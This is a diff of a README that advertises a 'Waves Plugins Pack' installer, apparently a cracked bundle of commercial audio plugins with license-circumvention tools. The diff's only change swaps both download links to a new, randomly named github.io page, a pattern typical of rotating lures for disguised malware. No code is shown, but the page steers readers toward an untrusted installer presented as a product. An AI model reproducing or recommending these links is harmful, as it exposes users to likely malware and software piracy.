@@ -2,7 +2,7 @@
 
 The **Waves Plugins Pack** is a comprehensive tool designed for music producers and audio engineers, providing a seamless installation package for the entire Waves audio plugin collection on Windows 10 and 11 systems. This bundle streamlines the process of acquiring and setting up professional-grade effects and instruments.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -44,7 +44,7 @@ A: The package includes tools and instructions to help manage your Waves license
 
 To get the latest and most secure version of the Waves Plugins Pack installer for Windows, please use the official download link.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
